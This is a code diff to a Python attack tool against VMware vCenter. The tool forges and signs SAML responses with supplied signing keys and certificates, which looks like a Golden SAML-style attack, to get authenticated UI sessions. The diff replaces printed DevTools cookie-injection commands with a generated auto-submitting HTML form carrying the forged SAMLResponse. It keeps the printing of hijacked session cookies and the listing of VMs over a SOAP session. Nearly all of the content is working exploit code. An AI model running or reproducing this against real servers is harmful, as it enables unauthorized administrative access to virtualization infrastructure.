@@ -2031,27 +2031,35 @@ def main():
         if choice not in ('1', '2'):
             return
 
-        hostname             = get_vcenter_hostname(target)
+        hostname              = get_vcenter_hostname(target)
         authn_id, relay_state = get_saml_authn_request(target)
-        signed               = build_and_sign_saml(target, hostname, domain,
-                                                    key_pem, cert1_pem, cert2_pem, authn_id)
-        cname, cval, ui_session = saml_login(target, signed, relay_state)
+        signed                = build_and_sign_saml(target, hostname, domain,
+                                                     key_pem, cert1_pem, cert2_pem, authn_id)
 
+        if choice == '1':
+            import tempfile
+            saml_b64 = base64.b64encode(signed).decode()
+            html = (
+                '<!DOCTYPE html><html><body onload="document.forms[0].submit()">\n'
+                f'<form method="POST" action="https://{target}/ui/saml/websso/sso">\n'
+                f'  <input type="hidden" name="SAMLResponse" value="{saml_b64}"/>\n'
+                f'  <input type="hidden" name="RelayState" value="{relay_state}"/>\n'
+                '  <noscript><input type="submit" value="Login"/></noscript>\n'
+                '</form></body></html>'
+            )
+            out = Path(tempfile.gettempdir()) / 'vcenter_saml_login.html'
+            out.write_text(html)
+            print(f'\n[+] Open in browser (act fast — SSO request expires in ~2 min):')
+            print(f'    file://{out}')
+            return
+
+        cname, cval, ui_session = saml_login(target, signed, relay_state)
         print(f'\n[+] https://{target}/ui/')
         print(f'    {cname}={cval}')
-        all_cookies = {cname: cval}
         for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
             v = ui_session.cookies.get(extra)
             if v:
                 print(f'    {extra}={v}')
-                all_cookies[extra] = v
-
-        if choice == '1':
-            print(f'\n[*] Browser injection — navigate to https://{target}/sdk first, then run in DevTools console:')
-            for k, v in all_cookies.items():
-                print(f'    document.cookie="{k}={v}; path=/ui; Secure; SameSite=Lax";')
-            print(f"    location.href='https://{target}/ui/';")
-            return
 
         # choice == '2' — get VIM SOAP session and enumerate VMs
         vc = VCenterSession(target, cname, cval,
